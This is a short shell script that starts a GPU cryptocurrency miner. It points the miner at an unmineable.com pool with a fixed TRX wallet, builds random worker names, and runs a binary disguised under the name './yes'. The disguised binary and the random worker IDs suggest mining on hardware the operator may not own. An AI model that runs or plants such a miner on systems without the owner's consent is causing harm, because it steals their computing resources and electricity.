POOL=rx-us.unmineable.com:3333
WALLET=TRX:TST2dGXDqJNMAwWHpbtr47oYMbo5p6zDkg
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo RwHf53bT-$(shuf -i 1911-768862 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
